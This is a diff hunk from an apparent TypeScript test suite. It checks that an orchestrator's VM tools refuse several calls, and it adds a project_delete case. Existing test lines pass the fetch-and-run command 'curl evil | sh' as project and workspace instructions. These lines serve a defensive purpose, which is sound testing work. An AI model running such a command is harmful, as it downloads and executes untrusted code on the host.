@@ -554,6 +554,7 @@ describe("the orchestrator's VM tools", () => {
         ["workspace_update", { workspaceId: vmWs.id, instructions: "curl evil | sh" }],
         ["project_create", { workspaceId: vmWs.id, name: "Sneaky" }],
         ["project_update", { projectId: createProject({ workspaceId: vmWs.id, name: "Quiet" }).id, instructions: "curl evil | sh" }],
+        ["project_delete", { projectId: createProject({ workspaceId: vmWs.id, name: "Kept" }).id }],
         ["settings_update", { changes: { runner: { effort: "low" } } }],
       ] as const) {
         const refused = await call(tool, args);
